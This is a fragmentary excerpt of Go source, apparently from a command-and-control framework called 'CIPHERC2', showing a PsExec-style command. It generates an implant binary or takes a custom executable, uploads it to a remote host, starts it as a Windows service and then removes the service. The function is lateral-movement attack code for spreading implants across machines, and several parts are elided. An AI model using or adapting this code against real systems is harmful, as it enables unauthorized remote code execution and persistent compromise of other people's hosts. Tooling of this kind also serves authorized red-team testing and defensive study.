...
func PsExecCmd(cmd *cobra.Command, con *console.CIPHERC2Client, args []string) {
	...
	if serviceName == "CIPHERC2" || serviceDesc == "CIPHERC2 implant" {
	...
	if customExe == "" {
		...
		con.SpinUntil(fmt.Sprintf("Generating CIPHERC2 binary for %s\n", profile), generateCtrl)
		...
		serviceBinary, _ = generate.GetCIPHERC2Binary(implantProfile, con)
	} else {
		// use a custom exe instead of generating a new CIPHERC2
	...
	upload, err := con.Rpc.Upload(context.Background(), &CIPHERC2pb.UploadReq{
		Encoder: "gzip",
		Data:    uploadGzip,
		Path:    filePath,
	...
	start, err := con.Rpc.StartService(context.Background(), &CIPHERC2pb.StartServiceReq{
		BinPath:            binaryPath,
		Hostname:           hostname,
		Request:            con.ActiveTarget.Request(cmd),
	...
	removed, err := con.Rpc.RemoveService(context.Background(), &CIPHERC2pb.RemoveServiceReq{
		ServiceInfo: &CIPHERC2pb.ServiceInfoReq{
			Hostname:    hostname,
			ServiceName: serviceName,
		},
		Request: con.ActiveTarget.Request(cmd),
